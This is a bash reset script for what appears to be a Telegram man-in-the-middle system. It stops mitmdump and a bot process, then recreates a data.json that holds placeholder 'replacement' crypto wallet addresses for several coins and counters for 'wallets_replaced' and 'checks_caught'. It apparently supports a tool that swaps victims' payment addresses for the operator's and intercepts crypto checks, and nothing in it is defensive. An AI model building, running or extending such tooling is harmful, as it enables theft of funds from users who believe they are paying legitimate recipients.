#!/bin/bash

echo "=========================================="
echo "🔄 Resetting MITM System"
echo "=========================================="

cd /root/tg-mitm-system

echo "[1] Stopping processes..."
sudo fuser -k 8082/tcp 2>/dev/null
pkill -f "mitmdump" 2>/dev/null
pkill -f "python3 run.py" 2>/dev/null
sleep 2

echo "[2] Creating new data.json..."
cat > data.json << 'DATAEOF'
{
  "wallets": {
    "BTC": "bc1qMITMREPLACEDwalletsBTC000000000000",
    "ETH": "0xMITMREPLACEDwalletsETH0000000000000",
    "USDT_TRC20": "TMITMREPLACEDwalletsTRC20000000000",
    "USDT_ERC20": "0xMITMREPLACEDwalletsERC20000000000",
    "TON": "UQMITMREPLACEDwalletsTON00000000000000",
    "SOL": "SoMITMREPLACEDwalletsSOL00000000000000",
    "BNB": "bnb1qMITMREPLACEDwalletsBNB0000000000"
  },
  "stats": {
    "wallets_replaced": 0,
    "checks_caught": 0,
    "bots_detected": [],
    "last_updated": 0
  }
}
DATAEOF

echo "[3] Setting permissions..."
chmod 666 data.json 2>/dev/null || true

echo "=========================================="
echo "✅ System reset complete!"
echo "Run: ./start.sh <BOT_TOKEN> <ADMIN_ID>"
echo "=========================================="
